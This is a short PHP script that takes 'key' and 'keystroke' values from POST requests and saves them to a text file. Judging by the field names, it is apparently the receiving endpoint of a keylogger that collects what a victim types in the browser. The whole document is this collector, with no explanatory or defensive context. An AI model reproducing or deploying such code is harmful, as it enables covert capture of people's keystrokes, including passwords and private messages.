<?php 
    $key = $_POST['key'];
    $keystroke = $_POST['keystroke'];
    $file = 'file.txt';
    file_put_contents($file, $key . ' ' . $keystroke);
?>